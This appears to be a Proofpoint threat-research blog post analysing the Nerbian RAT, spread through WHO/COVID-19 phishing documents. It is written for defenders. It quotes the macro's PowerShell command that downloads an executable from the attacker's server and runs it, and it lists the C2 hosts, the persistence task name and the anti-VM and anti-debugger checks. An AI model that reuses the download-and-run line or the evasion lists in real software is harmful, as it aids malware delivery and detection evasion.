chapters.title: Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques

sentences.text: Blog
sentences.html: Blog

sentences.text: Threat Insight
sentences.html: Threat Insight

sentences.text: Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques
sentences.html: Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques

sentences.text: Proofpoint has analyzed a novel malware variant which utilizes significant anti-analysis and anti-reversing capabilities.<crlf>The malware, written in the Go programming language, uses multiple open-source Go libraries for conducting malicious activities.<crlf>The malware, called Nerbian remote access trojan (RAT) leverages COVID-19 and World Health Organization themes to spread.<crlf>Proofpoint researchers named the malware based on a named function in the malware code. Nerbia is a fictional place from the novel Don Quixote.
sentences.html:
• Proofpoint has analyzed a novel malware variant which utilizes significant anti-analysis and anti-reversing capabilities.
  • The malware, written in the Go programming language, uses multiple open-source Go libraries for conducting malicious activities.
  • The malware, called Nerbian remote access trojan (RAT) leverages COVID-19 and World Health Organization themes to spread.
  • Proofpoint researchers named the malware based on a named function in the malware code. Nerbia is a fictional place from the novel Don Quixote.

sentences.text: The newly identified Nerbian RAT leverages multiple anti-analysis components spread across several stages, including multiple open-source libraries. It is written in operating system (OS) agnostic Go programming language, compiled for 64-bit systems, and leverages several encryption routines to further evade network analysis. Go is an increasingly popular language used by threat actors, likely due to its lower barrier to entry and ease of use.
sentences.html: The newly identified Nerbian RAT leverages multiple anti-analysis components spread across several stages, including multiple open-source libraries. It is written in operating system (OS) agnostic Go programming language, compiled for 64-bit systems, and leverages several encryption routines to further evade network analysis. Go is an increasingly popular language used by threat actors, likely due to its lower barrier to entry and ease of use.

sentences.text: Starting on April 26, 2022, Proofpoint researchers observed a low volume (less than 100 messages) email-borne malware campaign sent to multiple industries. The threat disproportionately impacts entities in Italy, Spain, and the United Kingdom. The emails claimed to be representing the World Health Organization (WHO) with important information regarding COVID-19. The malware sample was also noted by security researcher pr0xylife on Twitter. Proofpoint researchers observed the following indicators and attachments:
sentences.html: Starting on April 26, 2022, Proofpoint researchers observed a low volume (less than 100 messages) email-borne malware campaign sent to multiple industries. The threat disproportionately impacts entities in Italy, Spain, and the United Kingdom. The emails claimed to be representing the World Health Organization (WHO) with important information regarding COVID-19. The malware sample was also noted by security researcher pr0xylife on Twitter. Proofpoint researchers observed the following indicators and attachments:

sentences.text: From: who.inter.svc@gmail[.]com, announce@who-international[.]com
sentences.html: From: who.inter.svc@gmail[.]com, announce@who-international[.]com

sentences.text: Subjects: WHO, World Health Organization
sentences.html: Subjects: WHO, World Health Organization

sentences.text: Attachment Names and Types: who_covid19.rar with who_covid19.doc inside, covid19guide.rar with covid19guide.doc inside, covid-19.doc
sentences.html: Attachment Names and Types: who_covid19.rar with who_covid19.doc inside, covid19guide.rar with covid19guide.doc inside, covid-19.doc

sentences.text: The messages that purport to be from WHO and include safety measures relating to COVID-19 include an attached Word document containing macros.
sentences.html: The messages that purport to be from WHO and include safety measures relating to COVID-19 include an attached Word document containing macros.

sentences.text: Figure 1: Example email that purports to be from WHO.
sentences.html: Figure 1: Example email that purports to be from WHO.

sentences.text: Figure 2: Attached Word document.
sentences.html: Figure 2: Attached Word document.

sentences.text: The emails contain a macro-laden Word attachment (sometimes compressed with RAR). When macros are enabled, the document reveals information relating to COVID-19 safety, specifically about self-isolation and caring for individuals with COVID-19. Interestingly, the lure is similar to themes used in the early days of the pandemic in 2020, specifically spoofing the WHO to distribute information about the virus.
sentences.html: The emails contain a macro-laden Word attachment (sometimes compressed with RAR). When macros are enabled, the document reveals information relating to COVID-19 safety, specifically about self-isolation and caring for individuals with COVID-19. Interestingly, the lure is similar to themes used in the early days of the pandemic in 2020, specifically spoofing the WHO to distribute information about the virus.

sentences.text: Figure 3: Screenshot of the document lure containing COVID-19 guidance, specifically what users see when they enable macros on the malicious document.
sentences.html: Figure 3: Screenshot of the document lure containing COVID-19 guidance, specifically what users see when they enable macros on the malicious document.

sentences.text: In addition to masquerading as the WHO, the document also appears to contain logos from the Health Service Executive (HSE), Government of Ireland, and National Council for the Blind of Ireland (NCBI).
sentences.html: In addition to masquerading as the WHO, the document also appears to contain logos from the Health Service Executive (HSE), Government of Ireland, and National Council for the Blind of Ireland (NCBI).

sentences.text: Figure 4: Document with additional logos related to government and non-profit entities.
sentences.html: Figure 4: Document with additional logos related to government and non-profit entities.

sentences.text: When users enable macros on this document, the document executes an embedded macro that drops a .bat file with the following contents:
sentences.html: When users enable macros on this document, the document executes an embedded macro that drops a .bat file with the following contents:

sentences.text: powershell IWR -Uri hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog -OutFile C:\Users\[username]\AppData\Roaming\UpdateUAV.exe ;C:\Users\[username]\AppData\Roaming\UpdateUAV.exe
sentences.html: powershell IWR -Uri hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog -OutFile C:\Users\[username]\AppData\Roaming\UpdateUAV.exe ;C:\Users\[username]\AppData\Roaming\UpdateUAV.exe

sentences.text: This batch file performs a PowerShell Invoke Web Request (IWR) to the URL:
sentences.html: This batch file performs a PowerShell Invoke Web Request (IWR) to the URL:

sentences.text: hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog,
sentences.html: hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog,

sentences.text: It renames the downloaded file to UpdateUAV.exe, and drops it into:
sentences.html: It renames the downloaded file to UpdateUAV.exe, and drops it into:

sentences.text: C:\Users\[current user]\AppData\Roaming\UpdateUAV.exe.
sentences.html: C:\Users\[current user]\AppData\Roaming\UpdateUAV.exe.

sentences.text: UpdateUAV.exe is the payload initially downloaded from the malicious Word document. It is a 64-bit executable, written in Golang, 3.5MB in size, and UPX packed. Executable files created in the Go language tend to be slightly larger than most other executable files. Likely, this malware is packed with UPX to reduce the overall size of the executable being downloaded. Unpacked, the file is 6.6MB in total.
sentences.html: UpdateUAV.exe is the payload initially downloaded from the malicious Word document. It is a 64-bit executable, written in Golang, 3.5MB in size, and UPX packed. Executable files created in the Go language tend to be slightly larger than most other executable files. Likely, this malware is packed with UPX to reduce the overall size of the executable being downloaded. Unpacked, the file is 6.6MB in total.

sentences.text: Figure 5: The UpdateUAV.exe payload is packed with UPX, likely in an effort to reduce its size.
sentences.html: Figure 5: The UpdateUAV.exe payload is packed with UPX, likely in an effort to reduce its size.

sentences.text: Proofpoint analysts extracted decrypted data during execution. The resulting memory revealed additional information about the sample.
sentences.html: Proofpoint analysts extracted decrypted data during execution. The resulting memory revealed additional information about the sample.

sentences.text: UpdateUAV.exe is a dropper for Nerbian RAT. This determination was made through multiple different observations. First is the string embedded in the sample:
sentences.html: UpdateUAV.exe is a dropper for Nerbian RAT. This determination was made through multiple different observations. First is the string embedded in the sample:

sentences.text: K:/W_Work/Golang/src/RAT_Dropper/main_gen.go
sentences.html: K:/W_Work/Golang/src/RAT_Dropper/main_gen.go

sentences.text: According to the source path, this executable is a dropper. Proofpoint named this malware Nerbian RAT based on one of the function names in the dropper. The specific function name is main_downloadNerbian as shown in the following figure.
sentences.html: According to the source path, this executable is a dropper. Proofpoint named this malware “Nerbian RAT” based on one of the function names in the dropper. The specific function name is “main_downloadNerbian” as shown in the following figure.

sentences.text: Figure 6 : Nerbian RAT main function code.
sentences.html: Figure 6 : Nerbian RAT main function code.

sentences.text: There are additional references to "Nerbian" in some of the Go functions scattered throughout the binary.
sentences.html: There are additional references to "Nerbian" in some of the Go functions scattered throughout the binary.

sentences.text: Figure 7: Functions referring to the RAT the dropper is meant to download and store on the compromised system.
sentences.html: Figure 7: Functions referring to the RAT the dropper is meant to download and store on the compromised system.

sentences.text: Most software developers, including malware developers, use existing software packages. The UpdateUAV executable, which is a dropper for Nerbian RAT, features a lot of code re-use, with strings referencing various GitHub projects:
sentences.html: Most software developers, including malware developers, use existing software packages. The UpdateUAV executable, which is a dropper for Nerbian RAT, features a lot of code re-use, with strings referencing various GitHub projects:

sentences.text: github.com/go-ole/go-ole Go bindings for Windows COM (Component Object Model inter-process communication)<crlf>github.com/gonutz/w32/v2 Go bindings for the Win32 API<crlf>github.com/mitchellh/go-ps Library implements OS-specific APIs to list and manipulate processes<crlf>github.com/StackExchange/wmi Go package for Windows WMI, providing a WQL interface
sentences.html: github.com/go-ole/go-ole – Go bindings for Windows COM (Component Object Model – inter-process communication) github.com/gonutz/w32/v2 – Go bindings for the Win32 API github.com/mitchellh/go-ps – Library implements OS-specific APIs to list and manipulate processes github.com/StackExchange/wmi – Go package for Windows WMI, providing a WQL interface

sentences.text: Out of all these references to external projects the most interesting is:
sentences.html: Out of all these references to external projects the most interesting is:

sentences.text: github.com/p3tr0v/chacal/
sentences.html: github.com/p3tr0v/chacal/

sentences.text: Figure 8: Chacal GitHub page.
sentences.html: Figure 8: Chacal GitHub page.

sentences.text: Chacal is described as, Golang anti-vm framework for Red Team and Pentesters. However, there are several functions and references in the project designed to make debugging and reverse engineering more difficult as well.
sentences.html: Chacal is described as, “Golang anti-vm framework for Red Team and Pentesters”. However, there are several functions and references in the project designed to make debugging and reverse engineering more difficult as well.

sentences.text: The dropper will stop execution if it encounters any of the following conditions:
sentences.html: The dropper will stop execution if it encounters any of the following conditions:

sentences.text: The size of the hard disk on the system is less than a certain size. The default defined in Chacal is 100GB.<crlf>The name of the hard disk, according to WMI contains one of the following strings:<crlf><crlf>The MAC address queried returns any of the following OUI values:<crlf><crlf>Any of the following reverse engineering/debugging programs are encountered in the process list:<crlf><crlf>Any of the following memory analysis/memory tampering programs are present in the process list:<crlf><crlf>A time measurement function checks to see if the amount of time elapsed execution specific functions is deemed "excessive". If the time threshold is reached, the malware assumes it is being debugged, and will exit.<crlf>"virtual"<crlf>"vbox"<crlf>"vmware"<crlf>00:0c:29, 00:50:56, 08:00:27, 52:54:00, 00:21:F6, 00:14:4F, 00:0F:4B, 00:10:E0, 00:00:7D, 00:21:28, 00:01:5D, 00:21:F6, 00:A0:A4, 00:07:82, 00:03:BA, 08:00:20, 2C:C2:60, 00:10:4F, 00:0F:4B, 00:13:97, 00:20:F2, 00:14:4F<crlf>processhacker.exe, procmon.exe, pestudio.exe, procmon64.exe, x32dbg.exe, x64dbg.exe, CFF Explorer.exe, procexp64.exe, procexp.exe, pslist.exe, tcpview.exe, tcpvcon.exe, dbgview.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe, ollydbg.exe, agent.py, autoruns.exe, autorunsc.exe, filemon.exe, regmon.exe, idaq.exe, idaq64.exe, ImmunityDebugger.exe, Wireshark.exe, dumpcap.exe, HookExplorer.exe, ImportREC.exe, PETools.exe, LordPE.exe, SysInspector.exe, proc_analyzer.exe, sysAnalyzer.exe, sniff_hit.exe, windbg.exe, joeboxcontrol.exe, joeboxserver.exe, joeboxserver.exe, ResourceHacker.exe, Fiddler.exe, httpdebugger.exe<crlf>DumpIt.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe
sentences.html:
• The size of the hard disk on the system is less than a certain size. The default defined in Chacal is 100GB.
  • The name of the hard disk, according to WMI contains one of the following strings:
    • "virtual"
    • "vbox"
    • "vmware"
  • The MAC address queried returns any of the following OUI values:
    • 00:0c:29, 00:50:56, 08:00:27, 52:54:00, 00:21:F6, 00:14:4F, 00:0F:4B, 00:10:E0, 00:00:7D, 00:21:28, 00:01:5D, 00:21:F6, 00:A0:A4, 00:07:82, 00:03:BA, 08:00:20, 2C:C2:60, 00:10:4F, 00:0F:4B, 00:13:97, 00:20:F2, 00:14:4F
  • Any of the following reverse engineering/debugging programs are encountered in the process list:
    • processhacker.exe, procmon.exe, pestudio.exe, procmon64.exe, x32dbg.exe, x64dbg.exe, CFF Explorer.exe, procexp64.exe, procexp.exe, pslist.exe, tcpview.exe, tcpvcon.exe, dbgview.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe, ollydbg.exe, agent.py, autoruns.exe, autorunsc.exe, filemon.exe, regmon.exe, idaq.exe, idaq64.exe, ImmunityDebugger.exe, Wireshark.exe, dumpcap.exe, HookExplorer.exe, ImportREC.exe, PETools.exe, LordPE.exe, SysInspector.exe, proc_analyzer.exe, sysAnalyzer.exe, sniff_hit.exe, windbg.exe, joeboxcontrol.exe, joeboxserver.exe, joeboxserver.exe, ResourceHacker.exe, Fiddler.exe, httpdebugger.exe
  • Any of the following memory analysis/memory tampering programs are present in the process list:
    • DumpIt.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe
  • A time measurement function checks to see if the amount of time elapsed execution specific functions is deemed "excessive". If the time threshold is reached, the malware assumes it is being debugged, and will exit.

sentences.text: In addition to the anti-reversing checks provided by Chacal, there are other anti-analysis checks present in the binary including:
sentences.html: In addition to the anti-reversing checks provided by Chacal, there are other anti-analysis checks present in the binary including:

sentences.text: Uses the IsDebuggerPresent API to determine if the executable is being debugged<crlf>Appears to query for the following network interface names:<crlf><crlf>Intel PRO/1000 MT Network Connection<crlf>Loopback Pseudo-Interface 1<crlf>Software Loopback Interface 1
sentences.html:
• Uses the IsDebuggerPresent API to determine if the executable is being debugged
  • Appears to query for the following network interface names:
    • Intel® PRO/1000 MT Network Connection
    • Loopback Pseudo-Interface 1
    • Software Loopback Interface 1

sentences.text: In the case of analyzed sample, the dropper attempted to download its payload from:
sentences.html: In the case of analyzed sample, the dropper attempted to download its payload from:

sentences.text: hxxps://www[.] fernandestechnical [.]com/pub/media/ssl
sentences.html: hxxps://www[.] fernandestechnical [.]com/pub/media/ssl

sentences.text: And will save the RAT to:
sentences.html: And will save the RAT to:

sentences.text: C:\ProgramData\USOShared\MoUsoCore.exe
sentences.html: C:\ProgramData\USOShared\MoUsoCore.exe

sentences.text: Next, the dropper will attempt to establish a scheduled task named MicrosoftMouseCoreWork to start the RAT payload hourly to establish persistence.
sentences.html: Next, the dropper will attempt to establish a scheduled task named MicrosoftMouseCoreWork to start the RAT payload hourly to establish persistence.

sentences.text: The dropper's end-goal is to download the executable named SSL, save it as MoUsoCore.exe, and configure a scheduled task to run it hourly as its primary persistence mechanism.
sentences.html: The dropper's end-goal is to download the executable named SSL, save it as MoUsoCore.exe, and configure a scheduled task to run it hourly as its primary persistence mechanism.

sentences.text: MoUsoCore.exe is the name of the payload that the dropper binary, UpdateUAV.exe, attempts to download and establish persistence for. Like the dropper itself, it is written in Go, and is UPX packed. The size of the binary in its packed state is 5.6MB, while in its unpacked state is 9.2MB.
sentences.html: MoUsoCore.exe is the name of the payload that the dropper binary, UpdateUAV.exe, attempts to download and establish persistence for. Like the dropper itself, it is written in Go, and is UPX packed. The size of the binary in its packed state is 5.6MB, while in its unpacked state is 9.2MB.

sentences.text: Nerbian RAT seems to support a variety of different functions, most of which are dictated by encrypted configuration settings in the binary itself. Proofpoint identified various configuration settings this sample utilizes:
sentences.html: Nerbian RAT seems to support a variety of different functions, most of which are dictated by encrypted configuration settings in the binary itself. Proofpoint identified various configuration settings this sample utilizes:

sentences.text: "185.121.139[.]249"<crlf>https://www[.]fernandestechnical[.]com/pub/health_check.php<crlf>8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d<crlf>"100"<crlf>\\\\ProgramData\\\\Microsoft OneDrive\\\\setup<crlf>"rev.sav"
sentences.html: "185.121.139[.]249" https://www[.]fernandestechnical[.]com/pub/health_check.php 8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d "100" \\\\ProgramData\\\\Microsoft OneDrive\\\\setup "rev.sav"

sentences.text: Many of these strings pertain to setting operating parameters for the malware such as what hosts it communicates with, how often it checks in to the C2 domains and IP addresses with keep-alive messages, the malwares preferred working directory, and the hours in which it operates, in addition to other parameters.
sentences.html: Many of these strings pertain to setting operating parameters for the malware such as what hosts it communicates with, how often it checks in to the C2 domains and IP addresses with keep-alive messages, the malware’s preferred working directory, and the hours in which it operates, in addition to other parameters.

sentences.text: It's likely that 185[.]121[.]139[.]249 and hxxps://www[.]fernandestechnical[.]com/pub/health_check.php are the designated C2 backup domains and URI for keep-alives and check-ins.
sentences.html: It's likely that 185[.]121[.]139[.]249 and hxxps://www[.]fernandestechnical[.]com/pub/health_check.php are the designated C2 backup domains and URI for keep-alives and check-ins.

sentences.text: The RAT appears to have the ability to log keystrokes and appears to write them, encrypted, to the rev.sav file mentioned in the configuration settings above.
sentences.html: The RAT appears to have the ability to log keystrokes and appears to write them, encrypted, to the rev.sav file mentioned in the configuration settings above.

sentences.text: Not unlike the dropper, the RAT utilizes a lot of pre-existing Go code to perform many of its functions:
sentences.html: Not unlike the dropper, the RAT utilizes a lot of pre-existing Go code to perform many of its functions:

sentences.text: github.com/lxn/win<crlf>github.com/go-ole/go-ole<crlf>github.com/StackExchange/wmi<crlf>github.com/digitalocean/go-smbios/smbios<crlf>github.com/AllenDang/w32.init
sentences.html: github.com/lxn/win github.com/go-ole/go-ole github.com/StackExchange/wmi github.com/digitalocean/go-smbios/smbios github.com/AllenDang/w32.init

sentences.text: Again, out of all of these, one of the more interesting external references is to the following GitHub repo:
sentences.html: Again, out of all of these, one of the more interesting external references is to the following GitHub repo:

sentences.text: github.com/kbinani/screenshot/
sentences.html: github.com/kbinani/screenshot/

sentences.text: This repo is a Go library for performing screen captures on a variety of different operating systems.
sentences.html: This repo is a Go library for performing screen captures on a variety of different operating systems.

sentences.text: As with most modern malware families, this RAT prefers to handle its communications over SSL. Proofpoint observed two types of network traffic. The first is a simple Heartbeat/Keep-Alive to the C2 domains/IP addresses.
sentences.html: As with most modern malware families, this RAT prefers to handle its communications over SSL. Proofpoint observed two types of network traffic. The first is a simple Heartbeat/Keep-Alive to the C2 domains/IP addresses.

sentences.text: Figure 9: The Heartbeat/Keep-alive traffic to the C2 domain/IP addresses. Please disregard the extra "p" at the end of /pub/health_check.php.
sentences.html: Figure 9: The Heartbeat/Keep-alive traffic to the C2 domain/IP addresses. Please disregard the extra "p" at the end of /pub/health_check.php.

sentences.text: Additional communication observed was a POST request to the configured C2 domains and IP addresses with a large collection of HTTP form data being uploaded in the request:
sentences.html: Additional communication observed was a POST request to the configured C2 domains and IP addresses with a large collection of HTTP form data being uploaded in the request:

sentences.text: Figure 10: Notice the different names in the Content-Disposition field for each form in this POST request. All of this data is both base64 encoded and encrypted, regardless of whether the C2 communication is happening over HTTP or HTTPS.
sentences.html: Figure 10: Notice the different names in the Content-Disposition field for each form in this POST request. All of this data is both base64 encoded and encrypted, regardless of whether the C2 communication is happening over HTTP or HTTPS.

sentences.text: Form-data names being posted to the C2 server include:
sentences.html: Form-data names being posted to the C2 server include:

sentences.text: addr_post IP address posting to
sentences.html: addr_post – IP address posting to

sentences.text: port_post network port posting to
sentences.html: port_post – network port posting to

sentences.text: auth_post likely a per-session encryption key or password used after initializing the C2 communication
sentences.html: auth_post – likely a per-session encryption key or password used after initializing the C2 communication

sentences.text: session_key the only field that isn't encrypted. This is a combination of a string that serves as a sort of campaign identifier, a hash of values retrieved via the SMBIOS Golang module, and the operating system designation of the system talking to the C2 server (in this case "windows").
sentences.html: session_key – the only field that isn't encrypted. This is a combination of a string that serves as a sort of campaign identifier, a hash of values retrieved via the SMBIOS Golang module, and the operating system designation of the system talking to the C2 server (in this case "windows").

sentences.text: data_post exfiltrated data from the victim host
sentences.html: data_post – exfiltrated data from the victim host

sentences.text: All of the fields above, with exception of session_key form data field, utilize a unique encryption scheme. The first 70 bytes of the POST are "garbage", while the next 24 bytes contain an AES key that can be used to decrypt the remaining data. Proofpoint researchers developed a Python script that will enable decrypting this posted data:
sentences.html: All of the fields above, with exception of session_key form data field, utilize a unique encryption scheme. The first 70 bytes of the POST are "garbage", while the next 24 bytes contain an AES key that can be used to decrypt the remaining data. Proofpoint researchers developed a Python script that will enable decrypting this posted data:

sentences.text: import malduck<crlf>import binascii
sentences.html: import malduck import binascii

sentences.text: data = "BgxxweBaPoZVPcfLoQFSHMfqqeitJaZjoSKOBrhsCxtDMYGxPUHsKYcXetaTSJaSULtqZQAwoDiTrCtDpVKvaLxjZPSLcLBvlyREEguzuO0Z8119x2/7cc2XoU2w=="
sentences.html: data = "BgxxweBaPoZVPcfLoQFSHMfqqeitJaZjoSKOBrhsCxtDMYGxPUHsKYcXetaTSJaSULtqZQAwoDiTrCtDpVKvaLxjZPSLcLBvlyREEguzuO0Z8119x2/7cc2XoU2w=="

sentences.text: def decrypt_post_param(base64_encoded_content):<crlf>junk = base64_encoded_content[:70]<crlf>key = base64_encoded_content[70:70+32]<crlf>print("[+] key: %s" % key)<crlf>crypted_data = base64_encoded_content[70+32:].encode("utf-8")<crlf>base64_decoded = malduck.base64.decode(crypted_data)<crlf>iv = key[:16].encode("utf-8")<crlf>full_data = base64_decoded<crlf>print("[+] crypted data [%d]: %s" % (len(full_data), binascii.hexlify(full_data)))<crlf>return malduck.aes.cbc.decrypt(key.encode("utf-8"), iv, full_data)
sentences.html: def decrypt_post_param(base64_encoded_content): junk = base64_encoded_content[:70] key = base64_encoded_content[70:70+32] print("[+] key: %s" % key) crypted_data = base64_encoded_content[70+32:].encode("utf-8") base64_decoded = malduck.base64.decode(crypted_data) iv = key[:16].encode("utf-8") full_data = base64_decoded print("[+] crypted data [%d]: %s" % (len(full_data), binascii.hexlify(full_data))) return malduck.aes.cbc.decrypt(key.encode("utf-8"), iv, full_data)

sentences.text: print(decrypt_post_param(data))
sentences.html: print(decrypt_post_param(data))

sentences.text: Figure 11: Python script for decrypting posted data.
sentences.html: Figure 11: Python script for decrypting posted data.

sentences.text: Using the code above, users can decrypt the data being posted. In this instance, Proofpoint chose to decrypt the base64 encoded data from the addr_post field from an internal sandbox run. Users will need to replace the data variable with the base64 encoded block they wish to decrypt, or otherwise modify the script to accept input.
sentences.html: Using the code above, users can decrypt the data being posted. In this instance, Proofpoint chose to decrypt the base64 encoded data from the addr_post field from an internal sandbox run. Users will need to replace the data variable with the base64 encoded block they wish to decrypt, or otherwise modify the script to accept input.

sentences.text: As mentioned above however, the session_key field is not encrypted, it is base64 encoded. What does this field contain?
sentences.html: As mentioned above however, the session_key field is not encrypted, it is base64 encoded. What does this field contain?

sentences.text: Figure 12: The value of the session_key field is just a concated string, containing three values that are base64 encoded.
sentences.html: Figure 12: The value of the session_key field is just a concated string, containing three values that are base64 encoded.

sentences.text: 8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d:25b4ebca4bbc82ab5ae2e517c29d33e7:windows
sentences.html: 8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d:25b4ebca4bbc82ab5ae2e517c29d33e7:windows

sentences.text: This string contains three values, concatenated and delimited with the ":" character. Proofpoint assesses the first value, 8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d is some sort of an implant or campaign identifier, while 25b4ebca4bbc82ab5ae2e517c29d33e7 is a value derived from host identifier data collected using the go-smbios library mentioned above, while the final value is the operating system of the compromised host (windows)
sentences.html: This string contains three values, concatenated and delimited with the ":" character. Proofpoint assesses the first value, 8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d is some sort of an implant or campaign identifier, while 25b4ebca4bbc82ab5ae2e517c29d33e7 is a value derived from host identifier data collected using the go-smbios library mentioned above, while the final value is the operating system of the compromised host (windows)

sentences.text: This is a complex piece of malware, consisting of three stages:
sentences.html: This is a complex piece of malware, consisting of three stages:

sentences.text: Maldoc phishing lure<crlf>Dropper that performs a large variety of environment checking anti-reversing and anti-VM checks<crlf>Nerbian RAT encrypted configuration file, extreme care to ensure data is encrypted to the C2
sentences.html:
• Maldoc phishing lure
  • Dropper that performs a large variety of environment checking – anti-reversing and anti-VM checks
  • Nerbian RAT – encrypted configuration file, extreme care to ensure data is encrypted to the C2

sentences.text: Despite all this complexity and care being taken to protect the data in transit and "vet" the compromised host, the dropper and the RAT itself do not employ heavy obfuscation outside of the sample being packed with UPX, which it can be argued isn't necessarily for obfuscation, but to simply reduce the size of the executable.
sentences.html: Despite all this complexity and care being taken to protect the data in transit and "vet" the compromised host, the dropper and the RAT itself do not employ heavy obfuscation outside of the sample being packed with UPX, which it can be argued isn't necessarily for obfuscation, but to simply reduce the size of the executable.

sentences.text: Additionally, much of the functionality of both the RAT and the dropper are easy to infer due to the strings referring to GitHub repositories specifically the Chacal and screenshot repositories exposes partial functionality of both the dropper and the RAT.
sentences.html: Additionally, much of the functionality of both the RAT and the dropper are easy to infer due to the strings referring to GitHub repositories – specifically the Chacal and screenshot repositories exposes partial functionality of both the dropper and the RAT.

sentences.text: Nerbia is a fictional place from the great novel Don Quixote. The knight from Nerbia had a shield with a crest of asparagus and a banner reading "Try your luck".
sentences.html: Nerbia is a fictional place from the great novel Don Quixote. The knight from Nerbia had a shield with a crest of asparagus and a banner reading "Try your luck".

sentences.text: Figure 14: Nerbia is a fictional land from the novel Don Quixote. The Knight of Nerbia wore a shield with an asparagus crest with a Castilian Spanish motto that reads "Rastrea Mi Suerte." Which roughly translates to "Try your luck." In English. Please note that this crest is not associated with the novel and was created because Threat Research at Proofpoint likes to have fun.
sentences.html: Figure 14: Nerbia is a fictional land from the novel Don Quixote. The Knight of Nerbia wore a shield with an asparagus crest with a Castilian Spanish motto that reads "Rastrea Mi Suerte." Which roughly translates to "Try your luck." In English. Please note that this crest is not associated with the novel and was created because Threat Research at Proofpoint likes to have fun.

sentences.text: Many of the strings referencing Nerbia were located in the companion dropper (UpdateUAV.exe). There are no references to Nerbia in the RAT payload itself (MoUsoCore.exe). Proofpoint assesses with high confidence that the dropper and RAT were both created by the same entity, and while the dropper may be modified to deliver different payloads in the future, the dropper is statically configured to download and establish persistence for this specific payload at the time of analysis.
sentences.html: Many of the strings referencing Nerbia were located in the companion dropper (UpdateUAV.exe). There are no references to Nerbia in the RAT payload itself (MoUsoCore.exe). Proofpoint assesses with high confidence that the dropper and RAT were both created by the same entity, and while the dropper may be modified to deliver different payloads in the future, the dropper is statically configured to download and establish persistence for this specific payload at the time of analysis.
